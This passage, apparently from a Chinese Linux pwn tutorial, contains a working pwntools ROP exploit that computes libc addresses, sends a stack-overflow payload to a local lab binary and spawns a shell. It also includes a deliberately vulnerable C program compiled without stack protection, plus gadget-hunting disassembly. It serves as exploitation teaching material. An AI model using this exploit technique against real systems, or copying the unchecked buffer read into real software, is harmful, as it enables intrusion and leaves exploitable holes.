2 Strings information
3 ============================================================
4 0x000000000018cd57 : /bin/sh
构造利⽤并测试
这⾥实现两种gadgets 实现利⽤⽬的，分别是version1和version2。
1 #!/usr/bin/python
2 # -*- coding: UTF-8 -*-
3 import pwn
4
5 libc = pwn.ELF("./libc.so.6")
6 # p = pwn.process("./linux_x64_test2")
7 p = pwn.remote("127.0.0.1",10001)
8
9 systema_addr_str = p.recvuntil("\n")
10 systema_addr = int(systema_addr_str,16) # now system addr
11
12 binsh_static = 0x000000000018cd57
13 binsh2_static = next(libc.search("/bin/sh"))
14
15 print("binsh_static = 0x%x" % binsh_static)
16 print("binsh2_static = 0x%x" % binsh2_static)
17
18
19 binsh_offset = binsh2_static - libc.symbols["system"] # offset = static1
20 print("binsh_offset = 0x%x" % binsh_offset)
21
22 binsh_addr = binsh_offset + systema_addr
23 print("binsh_addr = 0x%x" % binsh_addr)
24
25
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 16/36
2020/7/27 linux pwn⼊门学习到放弃
26 # version1
27 # pop_ret_static = 0x0000000000021102 # pop rdi ; ret
28
29 # pop_ret_offset = pop_ret_static - libc.symbols["system"]
30 # print("pop_ret_offset = 0x%x" % pop_ret_offset)
31
32 # pop_ret_addr = pop_ret_offset + systema_addr
33 # print("pop_ret_addr = 0x%x" % pop_ret_addr)
34
35 # payload="A"*136 +pwn.p64(pop_ret_addr)+pwn.p64(binsh_addr)+pwn.p64(sys
36 # binsh_addr 低 x64 第⼀个参数是rdi
37 # systema_addr ⾼
38
39 # version2
40 pop_pop_call_static = 0x0000000000107419 # pop rax ; pop rdi ; call rax
41 pop_pop_call_offset = pop_pop_call_static - libc.symbols["system"]
42 print("pop_pop_call_offset = 0x%x" % pop_pop_call_offset)
43
44 pop_pop_call_addr = pop_pop_call_offset + systema_addr
45 print("pop_pop_call_addr = 0x%x" % pop_pop_call_addr)
46
47 payload="A"*136 +pwn.p64(pop_pop_call_addr)+pwn.p64(systema_addr)+pwn.p6
48 # systema_addr 低 pop rax
49 # binsh_addr ⾼ pop rdi
50
51 print("\n##########sending payload##########\n")
52 p.send(payload)
53 p.interactive()
最后测试如下:
1 panda@ubuntu:~/Desktop/test$ python test2.py
2 [*] '/lib/x86_64-linux-gnu/libc.so.6'
3 Arch: amd64-64-little
4 RELRO: Partial RELRO
5 Stack: Canary found
6 NX: NX enabled
7 PIE: PIE enabled
8 [+] Starting local process './linux_x64_test2': pid 118889
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 17/36
2020/7/27 linux pwn⼊门学习到放弃
9 binsh_static = 0x18cd57
10 binsh2_static = 0x18cd57
11 binsh_offset = 0x1479c7
12 binsh_addr = 0x7fc3018ffd57
13 pop_ret_offset = 0x-2428e
14 pop_ret_addr = 0x7fc301794102
15
16 ##########sending payload##########
17 [*] Switching to interactive mode
18 Hello, World
19 $ whoami
20 panda
实践3栈溢出去掉辅助函数
1 #include 
2 #include 
3 #include 
4
5 void vulnerable_function() {
6 char buf[128];
7 read(STDIN_FILENO, buf, 512);
8 }
9 int main(int argc, char** argv) {
10 write(STDOUT_FILENO, "Hello, World\n", 13);
11 vulnerable_function();
12 }
编译⽅法：
1 gcc -fno-stack-protector linux_x64_test3.c -o linux_x64_test3 -ldl //禁⽤栈
检查防护：
1 gdb-peda$ checksec linux_x64_test3
2 CANARY : disabled
3 FORTIFY : disabled
4 NX : ENABLED
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 18/36
2020/7/27 linux pwn⼊门学习到放弃
5 PIE : disabled
6 RELRO : Partial
7 gdb-peda$ quit
.bss段
相关概念：堆(heap)，栈(stack)，BSS段，数据段(data)，代码段(code /text)，
全局静态区，⽂字常量区，程序代码区。
BSS段：BSS段（bss segment）通常是指⽤来存放程序中未初始化的全局变量的⼀
块内存区域。
数据段：数据段（data segment）通常是指⽤来存放程序中已初始化的全局变量的⼀
块内存区域。
代码段：代码段（code segment/text segment）通常是指⽤来存放程序执⾏代码
的⼀块内存区域。这部分区域的⼤⼩在程序运⾏前就已经确定，并且内存区域通常属于
只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含⼀
些只读的常数变量，例如字符串常量等。
堆（heap）：堆是⽤于存放进程运⾏中被动态分配的内存段，它的⼤⼩并不固定，可动
态扩张或缩减。当进程调⽤malloc等函数分配内存时，新分配的内存就被动态添加到堆
上（堆被扩张）；当利⽤free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩
减）。
栈(stack)：栈⼜称堆栈，⽤户存放程序临时创建的局部变量。在函数被调⽤时，其参数
也会被压⼊发起调⽤的进程栈中，并且待到调⽤结束后，函数的返回值也会被存放回栈
中。由于栈的后进先出特点，所以栈特别⽅便⽤来保存/恢复调⽤现场。
程序的.bss段中，.bss段是⽤来保存全局变量的值的，地址固定，并且可以读可写。
Name Type Addr Off Size ES Flg Lk Inf
区 表区 区 相关 其他
起始 ⽂件的偏
名字 类型 ⼤ 的⼤ 标 区索 区信
地址 移地址
⼩ ⼩ 志 引 息
1 panda@ubuntu:~/Desktop/test$ readelf -S linux_x64_test3
2 There are 31 section headers, starting at offset 0x1a48:
3
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 19/36
2020/7/27 linux pwn⼊门学习到放弃
4 Section Headers:
5 [Nr] Name Type Address Offset
6 Size EntSize Flags Link Info Align
7 [24] .got.plt PROGBITS 0000000000601000 00001000
8 0000000000000030 0000000000000008 WA 0 0 8
9 [25] .data PROGBITS 0000000000601030 00001030
10 0000000000000010 0000000000000000 WA 0 0 8
11 [26] .bss NOBITS 0000000000601040 00001040
12 0000000000000008 0000000000000000 WA 0 0 1
13 Key to Flags:
14 W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
15 I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
16 O (extra OS processing required) o (OS specific), p (processor specifi
寻找合适的gadget
1 panda@ubuntu:~/Desktop/test$ objdump -d linux_x64_test3
2 00000000004005c0 :
3 4005c0: 41 57 push %r15
4 4005c2: 41 56 push %r14
5 4005c4: 41 89 ff mov %edi,%r15d
6 4005c7: 41 55 push %r13
7 4005c9: 41 54 push %r12
8 4005cb: 4c 8d 25 3e 08 20 00 lea 0x20083e(%rip),%r12 # 60
9 4005d2: 55 push %rbp
10 4005d3: 48 8d 2d 3e 08 20 00 lea 0x20083e(%rip),%rbp # 60
11 4005da: 53 push %rbx
12 4005db: 49 89 f6 mov %rsi,%r14
13 4005de: 49 89 d5 mov %rdx,%r13
14 4005e1: 4c 29 e5 sub %r12,%rbp
15 4005e4: 48 83 ec 08 sub $0x8,%rsp
16 4005e8: 48 c1 fd 03 sar $0x3,%rbp
17 4005ec: e8 0f fe ff ff callq 400400 
18 4005f1: 48 85 ed test %rbp,%rbp
19 4005f4: 74 20 je 400616 
20 4005f6: 31 db xor %ebx,%ebx
21 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1)
22 4005ff: 00
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 20/36
2020/7/27 linux pwn⼊门学习到放弃
23
24 400600: 4c 89 ea mov %r13,%rdx
25 400603: 4c 89 f6 mov %r14,%rsi
26 400606: 44 89 ff mov %r15d,%edi
27 400609: 41 ff 14 dc callq *(%r12,%rbx,8)
28 40060d: 48 83 c3 01 add $0x1,%rbx
29 400611: 48 39 eb cmp %rbp,%rbx
30 400614: 75 ea jne 400600 
31 400616: 48 83 c4 08 add $0x8,%rsp
32
33 40061a: 5b pop %rbx
34 40061b: 5d pop %rbp
35 40061c: 41 5c pop %r12
36 40061e: 41 5d pop %r13
37 400620: 41 5e pop %r14
38 400622: 41 5f pop %r15
39 400624: c3 retq
40 400625: 90 nop
41 400626: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1)
42 40062d: 00 00 00
程序⾃⼰的 __libc_csu_init 函数，没开PIE。
疑问:
1.这⾥可以直接write出got_system吗？既然都得到got_write这个是静态地址，还能
去调⽤，难道got表函数随便调⽤不变？
因为got_system 存储了实际的 libc-2.23.so!write 地址，所以去执⾏
got_system 然后打印出实际地址。
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 21/36